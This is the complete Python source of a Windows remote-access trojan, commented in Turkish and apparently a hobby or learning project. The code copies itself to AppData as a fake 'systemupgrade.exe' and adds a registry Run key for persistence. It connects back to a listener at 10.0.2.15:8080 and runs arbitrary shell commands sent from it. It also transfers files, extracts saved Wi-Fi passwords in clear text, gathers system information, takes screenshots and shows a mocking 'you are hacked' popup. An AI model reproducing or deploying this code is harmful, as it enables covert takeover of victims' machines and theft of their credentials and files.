import subprocess
import socket
import simplejson
import os
import shutil
import sys
import base64
import time
import ctypes
import pyautogui



def persistence(): #Sistem her açıldığında uygulamayı çalıştırma
		
		new_file=os.environ["appdata"] + "\\systemupgrade.exe" #bir new file oluştur ve appdata klasörünü bul ve appdataya systemupgrade.exe yi ekle. Oluşturulan new file'i systemupgrade.exe nin içine koy.
		if not os.path.exists(new_file): #Eğer new file oluşturulmamışsa girer

			shutil.copyfile(sys.executable,new_file) #oluşturulan new fileın içine açılan programın exesini kopyala.
			regedit_command= "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upgrade /t REG_SZ /d "+new_file #Regedit komutuyla oluşturulan new file'ı açılışta çalışır yapma komutu.
			subprocess.call(regedit_command,shell=True)	#Üst satırdakı komutu cmd'de çalıştırıp her açılışta açılır duruma geldik.


"""def dosyaya_gizleme():

		added_file=sys._MEIPASS + "\\aa.jpg"
		subprocess.Popen(added_file,shell=True)

	"""

class My_Socket:
	def __init__(self,ip,port):
		self.my_connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.my_connection.connect((ip,port))


	def json_send(self,data):

		json_data=simplejson.dumps(data).encode("utf-8")
		self.my_connection.send(json_data)


	def json_receiver(self):
		json_data=""
		while True:
			try:	
				json_data=json_data + self.my_connection.recv(1024).decode()
				return simplejson.loads(json_data)	

			except ValueError:
				continue	

	
	def komut_ciktisi_cd(self,directory):

		os.chdir(directory)
		if directory=="..":
			return "Bir klasör geri gidildi."

		else:	

			return directory+" klasorune girdiniz."


	
	def download(self,path):

		with open(path,"rb") as file: #dosya adını dinleyiciden aldık ve rb read binary (binary olarak okuduk çünkü resim de olabilir. Bİnary bilgisayar sisteminde karşılığı demek.) olarak okuduk ve file'a kaydettik.

			return base64.b64encode(file.read()) #file'ın içindeki veriyi okuyup döndürdük.




	def komut_ciktisi(self,command):
		
			
		return subprocess.check_output(command,shell=True,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL)


	def upload(self,path,content):


		with open(path,"wb") as veri:
			veri.write(base64.b64decode(content))	
			return "Veri gönderildi...."

	def upload2(self,path,content):


		with open(path,"wb") as veri:
			veri.write(base64.b64decode(content))	
					

	def wifi_tum_veri(self):
		komut= ("netsh wlan show all > Tum_wifi_verileri.txt")
		subprocess.call(komut,shell=True)
		return "Veriler Tum_wifi_verileri.txt dosyasına kaydedildi, alabilirsiniz.."


	def wifi_profil(self):
		komut= ("netsh wlan show profiles > profil_bilgileri.txt")
		subprocess.call(komut,shell=True)
		return "Hedef bilgisayarda önceden oturum açmış bütün profiller profil_bilgileri.txt dosyasına kaydedildi, alabilirsiniz.."

	def wifi_sifre(self,name):

		
		komut= ("netsh wlan show profile name=\"") +(name)+ ("\" key=clear > Wifi_verileri2.txt")

		print(komut)
		subprocess.call(komut,shell=True)
		return ""

	def system_info(self):
		
		komut="systeminfo > sistem.txt"
		subprocess.call(komut,shell=True)	
		return "Hedef bilgisayarın sistem bilgisi sistem.txt'ye kaydedildi, alabilirsiniz.."

	def cw(self,veri):	

		path = os.environ["appdata"] +"\\" + veri
		#print(path)
		shutil.copy(veri,path)
		ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
		return "Duvar kağıdı başarıyla değiştirildi.."
		"""command= ("del ")+(veri)
		print (command)
		subprocess.call(command,shell=True)"""
		

	def screenshot(self):

		pyautogui.screenshot(os.environ["appdata"] + "\\ekran.jpg")
		return "Ekran görüntüsü Appdata/Roaming'in içine kaydedildi, ekran.jpg olarak kaydedildi, alabilirsiniz.. "

	def alert(self):
		pyautogui.confirm(text= 'MERHABA HEDEF, HACKLENDİĞİNİN FARKINDA BİLE DEĞİLSİN DİMİ :)' , title= 'HACKER',buttons=['OK', 'Cancel'])	
		return "Hedefte mesaj göründü.."
		
		
	

	def SocketStarter(self):

		while True:
			
			
			command=self.json_receiver()
			try:
				if command[0]=="quit":

					self.json_send("bitti")
					self.my_connection.close()
					exit()

				elif command[0]=="cd" and len(command) > 1 : #cd desktop mesela. eğer gelen komut dizisinin içindeki veri 1 adetten büyükse bu koşula girer. Dinleyicide boşluktan ayır dediğimiz için her boşlukta veriye bir ekler.

					command_output=self.komut_ciktisi_cd(command[1]) #cd desktop'da ikinci veri gitmek istediği klasordür. Bunu komut_ciktisi_cd fonskiyonuna gönderir ve klasör değişilir. Sonucu da command_outputa eşitleyip dinleyiciye gönderirir.

				elif command[0]=="download" and len(command) > 1:

					command_output=self.download(command[1]) #indirmek istediğimiz dosya adını (Download picture) picture'yi indirme fonksyionuna gönderdik.


				elif command[0]=="upload" and len(command) > 1:
					
					command_output=self.upload(command[1],command[2])	

				elif command[0]=="wifi" and len(command)==1:

					command_output=self.wifi_tum_veri()

				elif command[0]=="wifi" and len(command) > 1 and command[1]=="profil":

					command_output=self.wifi_profil()

				elif command[0]=="wifi" and len(command) > 1 and command[1]=="sifre":
					
					command_output=self.wifi_sifre(command[2])		

				elif command[0]=="sistem":
					command_output=self.system_info()	

				elif command[0]=="screenshot":
					command_output=self.screenshot() 	

				elif command[0]=="alert":
					command_output=self.alert()	

				elif command[0]=="wallpaper" and len(command)>1:

					self.upload2(command[1],command[2])	
					command_output==self.cw(command[1])		
					
				else:
					command_output=self.komut_ciktisi(command)
			except Exception:
				command_output="Hata!"
						
			
			
			self.json_send(command_output)

		self.my_connection.close()

'''mesaj="Bağlandı"
mesaj=mesaj.encode("utf-8")
my_connection.send(mesaj)'''
persistence()
#dosyaya_gizleme()

i = 1
while(i<10 or self.my_connection.close()==1):

	try:	
		My_socket_nesnesi=My_Socket("10.0.2.15",8080)
		My_socket_nesnesi.SocketStarter()

	except ConnectionRefusedError:
		time.sleep(3)
		i+=1
		print(i)
		continue

			



